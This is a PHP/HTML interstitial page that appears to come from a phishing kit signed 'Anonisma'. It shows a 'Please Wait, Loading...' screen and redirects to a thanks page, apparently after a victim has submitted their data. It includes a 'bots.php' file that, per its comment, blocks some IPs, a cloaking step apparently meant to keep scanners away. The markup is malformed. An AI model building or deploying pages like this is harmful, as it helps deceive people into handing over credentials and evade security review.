<?php
if (!isset($_SESSION)) {
  session_start();
}
include "bots.php";  //Para Bloquear Algunas IPs / GALK HADA WA7D , srat lsano ja y7za9 o howa yzaghrk hhhh, 9dima -_-
?>
<!DOCTYPE html>
<html>
	<!--Coded by Anonisma-->
	<head>
		<title>Please Wait, Loading...</title> 
		<meta http-equiv="refresh" content="3;url=thanks.php">
			<link rel="shortcut icon" <link rel="logo-icon" href="../set/img/iconisma.ico">
						<meta  content="text/html; charset=UTF-8">   
						</head>
						<link rel="stylesheet" href="../set/cssisma/Anonisma.css">
							<BODY BACKGROUND="img/Anonisma.png">
								<div class="Coded-by-Anonisma"> 
									<div class="trayNavInner clearfix" >  
										<form>  
											<div align="center">
												<img src="../set/img/logisma.gif" width="55" height="55">
													<p>
														<IMG src="../set/img/333isma.png">
														</p>
													</br>
													<center> 
														<a href="../thanks.php">
															<IMG src="../set/img/loisma.png">
															</a>
														</center> 
													</div>
												</div>  
											</form>
										</section>
									</div>  
								</footer>
							</div>
						</body>
</html>